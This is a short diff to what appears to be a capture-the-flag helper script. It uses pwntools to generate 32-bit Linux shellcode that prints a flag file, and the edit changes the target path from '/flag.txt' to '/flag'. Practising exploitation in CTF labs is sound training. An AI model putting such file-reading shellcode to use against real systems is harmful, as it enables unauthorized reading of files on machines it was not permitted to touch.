@@ -1,7 +1,7 @@
 import pwn
 
 pwn.context.arch = 'i386'  # Set architecture to 32-bit
-shellcode = pwn.shellcraft.i386.linux.cat('/flag.txt') # + pwn.shellcraft.i386.linux.exit() # Generate shellcode to cat /flag.txt
+shellcode = pwn.shellcraft.i386.linux.cat('/flag') # + pwn.shellcraft.i386.linux.exit() # Generate shellcode to cat /flag
 assembled_shellcode = pwn.asm(shellcode)  # Assemble the shellcode
 
 # Print out the generated shellcode in a format that can be copied
